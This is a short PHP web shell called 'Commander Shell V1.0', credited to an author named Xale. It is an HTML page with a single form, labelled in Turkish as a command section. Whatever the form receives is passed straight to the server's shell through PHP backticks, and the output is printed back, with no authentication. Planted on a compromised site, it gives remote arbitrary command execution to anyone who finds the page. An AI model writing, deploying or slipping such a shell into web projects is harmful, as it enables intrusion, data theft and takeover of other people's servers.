<html>
<head>
<style>
@import url('https://fonts.googleapis.com/css2?family=Nunito&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap');

.header {
       color: white;
       font-size: 40px;
       font-family: 'Roboto Mono', monospace;
       background: -webkit-linear-gradient(#eee, #ADADAD);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
}

.text {
     color: black;
     font-family: 'Nunito';
	 font-size: 20px;

</style>
<title>Commander Shell V1.0 - By Xale</title>
</head>
<body>
<center>
<br><br><br><br><br><br>
<p class="header">Commander Shell</p>
<p class="text">Version: v1.0</p>
<p class="text">Coded By Xale</p>
<p class="text">My GitHub: @xaletr</p>
<p class="text">Komut Bölümü:</p>
	<center>
		<br>
<form action="cmd.php" method="POST">
	<input type="text" name="cmd">
	<br>
	<br>
	<input type="submit" name="Send">
	<br>
</center>
<?php 
$cmd = $_POST['cmd'];
echo '<pre>', `$cmd`, '</pre>';



 ?>
</body>
</html>